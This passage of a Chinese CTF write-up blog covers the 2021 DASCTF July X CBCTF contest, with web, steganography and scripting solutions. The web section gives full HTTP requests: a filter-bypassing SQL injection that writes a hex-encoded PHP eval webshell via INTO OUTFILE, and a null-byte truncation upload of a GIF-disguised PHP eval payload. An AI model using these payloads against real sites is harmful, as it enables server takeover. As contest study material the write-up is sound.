class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">215</span><br><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">3138</span>db<span class="hljs-number">70</span>-ea<span class="hljs-number">68</span>-<span class="hljs-number">4</span>bad-<span class="hljs-number">8</span>cb<span class="hljs-number">4</span>-<span class="hljs-number">0</span>c<span class="hljs-number">6</span>e<span class="hljs-number">63</span>b<span class="hljs-number">7894</span>b.node<span class="hljs-number">4</span>.buuoj.cn<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">3138</span>db<span class="hljs-number">70</span>-ea<span class="hljs-number">68</span>-<span class="hljs-number">4</span>bad-<span class="hljs-number">8</span>cb<span class="hljs-number">4</span>-<span class="hljs-number">0</span>c<span class="hljs-number">6</span>e<span class="hljs-number">63</span>b<span class="hljs-number">7894</span>b.node<span class="hljs-number">4</span>.buuoj.cn/admin/login.php<br><span class="hljs-attribute">Cookie</span>: PHPSESSID=om<span class="hljs-number">10447</span>imss<span class="hljs-number">7</span>jbttdpjm<span class="hljs-number">5</span>lsf<span class="hljs-number">24</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><br><span class="hljs-attribute">user</span>=admin&#x27;/**/union/**/selselectect/**/<span class="hljs-number">1</span>,<span class="hljs-number">0</span>x<span class="hljs-number">3</span>c<span class="hljs-number">3</span>f<span class="hljs-number">3</span>d<span class="hljs-number">406576616</span>c<span class="hljs-number">28245</span>f<span class="hljs-number">504</span>f<span class="hljs-number">53545</span>b<span class="hljs-number">2761746</span>b<span class="hljs-number">78275</span>d<span class="hljs-number">293</span>f<span class="hljs-number">3</span>e,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>/**/into/**/outoutfilefile/**/&#x27;/var/www/html/atkx.php&#x27;#&amp;password=<span class="hljs-number">123456</span>&amp;code=&amp;submit=true&amp;submit.x=<span class="hljs-number">47</span>&amp;submit.y=-<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>
<p>蚁剑连接成功getflag </p>
<h2 id="jj’s-camera"><a href="#jj’s-camera" class="headerlink" title="jj’s camera"></a>jj’s camera</h2><p>00截断</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /qbl.php?id=<span class="hljs-number">1</span>.php%<span class="hljs-number">0012312312321321</span>&amp;url=http://baidu.com HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: hnode<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">27281</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10</span>.<span class="hljs-number">15</span>; rv:<span class="hljs-number">56</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">56</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Referer</span>: https://hnode<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">27281</span>/sc.php?id=<span class="hljs-number">12312312321321</span>&amp;url=http://baidu.com<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">86</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><br><span class="hljs-attribute">img</span>=data%<span class="hljs-number">3</span>Aimage%<span class="hljs-number">2</span>Fpng%<span class="hljs-number">3</span>Bbase<span class="hljs-number">64</span>%<span class="hljs-number">2</span>CR<span class="hljs-number">0</span>lGODk<span class="hljs-number">8</span>P<span class="hljs-number">3</span>BocApwaHBpbmZvKCk<span class="hljs-number">7</span>CkBldmFsKCRfUE<span class="hljs-number">9</span>TVFsxXSk<span class="hljs-number">7</span><br></code></pre></td></tr></table></figure>


<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="ezSteganography"><a href="#ezSteganography" class="headerlink" title="ezSteganography"></a>ezSteganography</h2><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs maxima">┌──(kali㉿kali)-[~/桌面]<br>└─$ zsteg -E <span class="hljs-string">&quot;b1,g,lsb,xy&quot;</span> ezSteganography-flag.png &gt; out.png<br><br><br><br>First <span class="hljs-built_in">part</span> of flag <span class="hljs-built_in">is</span>:flag&#123;2e9ec6480d0515<br>QIM quantization <span class="hljs-built_in">is</span> useful to <span class="hljs-built_in">get</span> another flag.<span class="hljs-keyword">step</span> <span class="hljs-built_in">is</span> <span class="hljs-number">20</span><br></code></pre></td></tr></table></figure>


<p>QIM量化</p>
<figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-keyword">from</span> <span class="hljs-type">PIL</span> <span class="hljs-keyword">import</span> <span class="hljs-type">Image</span><br><span class="hljs-keyword">from</span> <span class="hljs-type">Crypto</span>.<span class="hljs-type">Util</span> <span class="hljs-keyword">import</span> number<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br>def extract(delta,y):<br>	<span class="hljs-keyword">out</span>=[]<br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> (delta/<span class="hljs-number">2</span>-y%delta):<br>		<span class="hljs-keyword">if</span> i&gt;<span class="hljs-number">0</span>:<br>			<span class="hljs-keyword">out</span>.append(<span class="hljs-number">1</span>)<br>		<span class="hljs-keyword">else</span>:<br>			<span class="hljs-keyword">out</span>.append(<span class="hljs-number">0</span>)<br>	<span class="hljs-keyword">out</span>=np.<span class="hljs-built_in">array</span>(<span class="hljs-keyword">out</span>)<br>	<span class="hljs-keyword">return</span> <span class="hljs-keyword">out</span><br><br>p=np.<span class="hljs-built_in">array</span>(<span class="hljs-type">Image</span>.open(&#x27;ezSteganography-flag.png&#x27;))<br>R,G,B=p[:,:,<span class="hljs-number">0</span>],p[:,:,<span class="hljs-number">1</span>],p[:,:,<span class="hljs-number">2</span>]<br>G=G.ravel()<br><br>te_out=extract(<span class="hljs-number">20</span>,G)<br>plt.imshow(np.<span class="hljs-built_in">array</span>(te_out).reshape(<span class="hljs-number">1440</span>,<span class="hljs-number">2560</span>))<br>plt.show()<br></code></pre></td></tr></table></figure>


<p>得到另一半flag</p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122242-47584.png" alt="image-20210815122241546"></p>
<h2 id="red-vs-blue"><a href="#red-vs-blue" class="headerlink" title="red_vs_blue"></a>red_vs_blue</h2><p>红队和蓝队将开展66轮对抗，你能预测出每轮对抗的结果吗？</p>
<p>exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">from</span> pwn import *       <span class="hljs-comment">#需要用到pwntools模块</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">25900</span>)        <span class="hljs-comment">#连接，相当于nc，注：25900是端口，每一次开靶机基本上都不同</span><br>payload = [<span class="hljs-string">&#x27;r&#x27;</span>] * <span class="hljs-number">66</span>    <span class="hljs-comment">#先把答案设置成66个‘r’</span><br>restart = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> restart:<br>    restart = <span class="hljs-number">0</span>        <span class="hljs-comment">#先把restart改为0，避免死循环</span><br>    <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">66</span>):        <span class="hljs-comment">#循环发送答案</span><br>        io.recvuntil(<span class="hljs-string">&#x27;choose one [r] Red Team,[b] Blue Team:&#x27;</span>)        <span class="hljs-comment">#接收函数，一直接收，直到接收到设定的字符串才进行下一语句</span><br>        io.sendline(payload[i])        <span class="hljs-comment">#发送函数，上传第i个答案</span><br>        io.recvuntil(<span class="hljs-string">&#x27;Team&#x27;</span>)<br>        io.recvuntil(<span class="hljs-string">&quot;Team\n&quot;</span>)        <span class="hljs-comment">#因为输入一个答案后会有两个&#x27;Team&#x27;的字符串，所以接收两个‘Team&#x27;后进行下一语句</span><br>        p = io.recv(<span class="hljs-number">10</span>)        <span class="hljs-comment">#接收函数，可控制接收的字符数量，这里接收10个字符</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;The number&#x27;</span> in p:        <br>            <span class="hljs-keyword">continue</span>        <span class="hljs-comment">#接收到&#x27;The number&#x27;则说明这个答案对了，继续进行下一个for语句发送下一个答案</span><br>        <span class="hljs-keyword">else</span>:<br>            io.recvuntil(<span class="hljs-string">&#x27;Play again? (y/n): &#x27;</span>)         <span class="hljs-comment">#如果没有接收到&#x27;The number&#x27;,则第i个答案错误，接收完字符</span><br>            payload[i] = <span class="hljs-string">&#x27;b&#x27;</span>        <span class="hljs-comment">#将第i个答案改正</span><br>            io.sendline(<span class="hljs-string">&#x27;y&#x27;</span>)        <span class="hljs-comment">#发送‘y’重新游戏</span><br>            restart = <span class="hljs-number">1</span>         <span class="hljs-comment">#将restart改为1，将会重新while循环</span><br>            <span class="hljs-keyword">break</span><br>io.interactive()<br></code></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs autoit">┌──(kali㉿kali)-[~/桌面]<br>└─$ python3 <span class="hljs-built_in">exp</span>.py                                                                         <br>[*] Checking <span class="hljs-keyword">for</span> new versions of pwntools<br>    <span class="hljs-keyword">To</span> disable this functionality, set the contents of /home/kali/.cache/.pwntools-cache<span class="hljs-number">-3.9</span>/update <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;never&#x27;</span> (old way).<br>    <span class="hljs-literal">Or</span> add the following lines <span class="hljs-keyword">to</span> ~/.pwn.conf <span class="hljs-literal">or</span> ~/.config/pwn.conf (<span class="hljs-literal">or</span> /etc/pwn.conf system-wide):<br>        [update]<br>        interval=never<br>[*] A newer version of pwntools is available on pypi (<span class="hljs-number">4.7</span><span class="hljs-number">.0</span>.dev0 --&gt; <span class="hljs-number">4.7</span><span class="hljs-number">.0</span>b0).<br>    Update <span class="hljs-keyword">with</span>: $ pip install -U pwntools==<span class="hljs-number">4.7</span><span class="hljs-number">.0</span>b0<br>[+] Opening connection <span class="hljs-keyword">to</span> node4.buuoj.cn on port <span class="hljs-number">25868</span>: Done<br>/home/kali/桌面/<span class="hljs-built_in">exp</span>.py:<span class="hljs-number">14</span>: BytesWarning: Text is <span class="hljs-literal">not</span> bytes<span class="hljs-comment">; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br>  p.recvuntil(<span class="hljs-string">&#x27;choose one [r] Red Team,[b] Blue Team:\n&#x27;</span>)<br>/home/kali/桌面/<span class="hljs-built_in">exp</span>.py:<span class="hljs-number">16</span>: BytesWarning: Text is <span class="hljs-literal">not</span> bytes<span class="hljs-comment">; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br>  p.sendline(list[i])<br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">0</span><br>/home/kali/桌面/<span class="hljs-built_in">exp</span>.py:<span class="hljs-number">33</span>: BytesWarning: Text is <span class="hljs-literal">not</span> bytes<span class="hljs-comment">; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br>  p.sendline(<span class="hljs-string">&#x27;y&#x27;</span>)<br>/home/kali/桌面/<span class="hljs-built_in">exp</span>.py:<span class="hljs-number">28</span>: BytesWarning: Text is <span class="hljs-literal">not</span> bytes<span class="hljs-comment">; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br>  p.recvuntil(<span class="hljs-string">&#x27;choose one [r] Red Team,[b] Blue Team:\n&#x27;</span>)<br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">1</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">3</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">4</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">9</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">10</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">12</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">13</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">18</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">20</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">22</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">24</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">26</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">28</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">29</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">31</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">32</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">33</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">35</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">38</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">39</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">40</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">41</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">44</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">45</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">46</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">48</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">50</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">53</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">54</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">55</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">58</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">60</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">61</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">66</span><br>[*] Closed connection <span class="hljs-keyword">to</span> node4.buuoj.cn port <span class="hljs-number">25868</span><br>[+] Flag: flag&#123;b<span class="hljs-string">&#x27;c069b2d7-0fca-4819-a656-44e4451deaaf&#x27;</span>&#125;<br>[+] Time: <span class="hljs-number">50.63801121711731</span>s<br></code></pre></td></tr></table></figure>


<h2 id="Just-a-GIF"><a href="#Just-a-GIF" class="headerlink" title="Just a GIF"></a>Just a GIF</h2><p>提取帧数，一共451帧,对比发现11帧一组，一共41组.</p>
<p>把除第1组之后的每一组的第n帧跟第一组的第n帧比较，相同为纯白，不同为纯黑</p>
<p>把同内容的图片作为一个系列，然后系列中的图片与该系列第一张图片比较，新建一张</p>
<p>83x83的空白图，把所有存在像素值不同的位置标记为黑色，即可得到隐藏的11张图片</p>
<p>中的1张，剩下的以此类推即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding: utf-8 </span><br><span class="hljs-keyword">import</span> os <br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image <br><br><span class="hljs-comment">#分离gif </span><br><br>img=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Just_a_GIF.gif&#x27;</span>) <br>os.mkdir(<span class="hljs-string">&#x27;./png&#x27;</span>) <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(img.n_frames): <br>	img.seek(i) <br>	new = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, img.size) <br>	new.paste(img) <br>	new.save(<span class="hljs-string">&#x27;png\\&#x27;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;.png&#x27;</span>) <br><br>    <br>    <br><span class="hljs-comment">#处理分离出来的png </span><br>os.mkdir(<span class="hljs-string">&#x27;./flag&#x27;</span>) <br><br>path1=<span class="hljs-string">r&quot;./flag/&quot;</span> <br>path2=<span class="hljs-string">r&quot;./png/&quot;</span> <br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>): <br>	img=Image.<span class="hljs-built_in">open</span>(path2+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;.png&#x27;</span>) <br>	<span class="hljs-comment">#隐藏的图片尺寸为83*83 </span><br>	img1=Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>,(<span class="hljs-number">83</span>,<span class="hljs-number">83</span>),(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>)) <br>	<span class="hljs-comment">#图片每帧跟同内容的第一帧进行像素比较，不同处用黑色，叠加起来 </span><br>	<span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>): <br>		im=Image.<span class="hljs-built_in">open</span>(path2+<span class="hljs-built_in">str</span>((h+<span class="hljs-number">1</span>)*<span class="hljs-number">11</span>+i)+<span class="hljs-string">&#x27;.png&#x27;</span>) <br>		width,height=img.size <br>		<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,width):<br>			<span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,height): <br>				tmp = img.getpixel((j,k)) <br>				tmp1 = im.getpixel((j,k)) <br>				<span class="hljs-keyword">if</span> tmp != tmp1: <br>					img1.putpixel((j,k),(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)) <br>	img1.save(path1+<span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>)+<span class="hljs-string">&#x27;.png&#x27;</span>) <br></code></pre></td></tr></table></figure>
<p>得到11张图片</p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122323-509098.png" alt="image-20210815122322173"></p>
<p>按照10和11的顺序拼接得到</p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122333-324537.png" alt="image-20210815122331942"></p>
<p>DataMatrix：<a target="_blank" rel="noopener" href="https://demo.dynamsoft.com/barcode-reader/">https://demo.dynamsoft.com/barcode-reader/</a></p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122350-188687.png" alt="image-20210815122347387"></p>
<h2 id="Nuclear-wastewater"><a href="#Nuclear-wastewater" class="headerlink" title="Nuclear wastewater"></a>Nuclear wastewater</h2><p>小明去日本旅游时，发现了一张被核废水污染过的二维码，你能从中发现什么信息吗。</p>
<p>思路：直接处理图片的三个通道，观察rgb数值，并进行chr，可以发现有大量的重复的内容，猜测可以利用词频进行排序</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>pic = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Nuclear wastewater.png&#x27;</span>)<br>a, b = pic.size<br>list1 = []  <span class="hljs-comment">#将三个像素值都存入列表元素</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,b,<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, a, <span class="hljs-number">10</span>):<br>        pixel = pic.getpixel((x, y))<br>        <span class="hljs-keyword">if</span> pixel == (<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>):<br>             <span class="hljs-keyword">continue</span><br>        r, g, b1 = pixel<br>        list1.extend([r, g, b1])<br><span class="hljs-comment">#print(list1)</span><br><br>dic1 = &#123;&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> list1:<br>    dic1[i] = dic1.get(i, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span><br>result = <span class="hljs-built_in">sorted</span>(dic1.items(), key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-number">1</span>], reverse=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> result:<br>    print(<span class="hljs-built_in">chr</span>(s[<span class="hljs-number">0</span>]), end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">theKEYis:</span><span class="hljs-meta">#R@/&amp;p~!(▒?£ñ$ªVJÞÍFjÀÈ÷¢©¼§UÌ¦õ±·ðäôÉCS</span><br><span class="hljs-number">2</span>ÚHÏ&gt;Á<br></code></pre></td></tr></table></figure>
<p>得到口令#R@/&amp;p~!，解压得到flag.txt</p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122426-607150.png" alt="image-20210815122425969"></p>
<p>有猫腻，vim查看一下</p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122440-299502.png" alt="image-20210815122438743"></p>
<p>零宽字节隐写，包含200C、200D、200E，</p>
<p>解题工具：<a target="_blank" rel="noopener" href="https://330k.github.io/misc_tools/unicode_steganography.html">https://330k.github.io/misc_tools/unicode_steganography.html</a></p>
<p>先在下面设置一下，勾选零宽字符：</p>
<p>U+200C ZERO WIDTH NON-JOINER<br>U+200D ZERO WIDTH JOINER<br>U+200E LEFT-TO-RIGHT MARK</p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122452-433384.png" alt="image-20210815122451134"></p>
<p>根据提示Citrix CTX1解密</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">OIENKMAJOLEOKMAJOHECLHBCPGFDLNBIPAFFLPBKPIFNLEBBPPFKLFBAPEFBLJBMPHFCLEBBPMFJLEBBPLFOLHBCPCFHLNBIPDFGLHBCPPFKLIBNPHFCLDBGPGFDLBBEPPFKLHBCPPFKLMBJPDFGLCBHPHFCLBBEPIFNLNBIPOFLLMBJPDFGLBBEPEFBLBBEPPFKLGBDPOFLLABFPMFJLABFPCFHLNBIPDFGLMBJPEFBLIBNPHFCLLBOPOFLLBBEPIFNLDBGPAFFKAAFOPEKKDAGOGEDKJAMOAEFKLAOOIENLIBNPEFBLLBOPJFMLFBAPLFOLFBAPNFILEBBPLFOLFBAPAFFLJBMPHFCLJBMPBFELIBNPHFCLIBNPNFILBBEPPFKKPAKOHECKMAJOAEFKKAPOIENKFAAOLEOKHACOPEKKAAFOPEKKAAFOFEAKJAMOHECKLAOODEGKMAJOAEFKPAKONEIKBAEOIENKAAFODEGKAAFOPEKKLAOOOELKJAMOAEFKGADOFEAKEABOLEOKOALOLEOKJAMOAEFKIANOLEOKIANOEEBKFAAOHECKBAEOIENKJAMOKEPKMAJPMFJLCBHPEFBLNBI</span><br></code></pre></td></tr></table></figure>
<p>解码两次得到flag</p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122503-379175.png" alt="image-20210815122502554"></p>

      
      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2021/08/09/2021DASCTF-July-X-CBCTF-4th/">2021DASCTF July X CBCTF 4th</a></p>
        <p><span>文章作者:</span><a href="/" title="访问  的个人博客"></a></p>
        <p><span>发布时间:</span>2021年08月09日 - 22时26分</p>
        <p><span>最后更新:</span>2021年08月15日 - 12时25分</p>
        <p>
